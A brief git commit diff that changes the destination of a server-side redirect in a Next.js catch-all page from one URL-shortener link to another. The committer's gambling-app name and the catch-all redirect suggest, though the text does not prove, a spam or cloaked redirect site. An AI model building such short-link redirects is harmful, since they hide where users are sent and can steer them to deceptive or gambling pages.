527eb72031d6f11a4042d928065dc4def9f976e9
Teenpattimaster2024 <152017047+Teenpattimaster2024@users.noreply.github.com>
2023-11-27 14:23:28 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://h27.in/aw/hyugf`
+					`https://cutt.ly/hyugf`
 				}`,
 			},
 		};
